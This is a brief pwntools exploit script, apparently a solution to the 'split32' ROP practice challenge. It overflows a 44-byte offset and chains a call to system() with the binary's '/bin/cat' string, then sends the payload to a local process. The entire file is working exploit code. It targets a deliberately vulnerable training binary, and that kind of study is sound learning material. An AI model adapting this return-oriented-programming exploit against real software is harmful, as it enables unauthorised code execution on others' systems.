from pwn import *
from pprint import pprint

binary = ELF('./split32')

p = binary.process()

# pprint(binary.symbols)

# useFulfunc = b"\x0c\x86\x04\x08"

offset = 44

# payload = b'A' * offset + useFulfunc

bin_cat_addr = next(binary.search(b'/bin/cat'))
log.info(f'bin_cat_addr: {hex(bin_cat_addr)}')

rop = ROP(binary)
rop.system(bin_cat_addr)

print(rop.chain())

payload = b"A"*offset + rop.chain()
# payload = fit({ offset: rop.chain() }) # same as above

print(payload)

with open("payload", "wb") as f:
    f.write(payload)

p.sendline(payload)
p.interactive()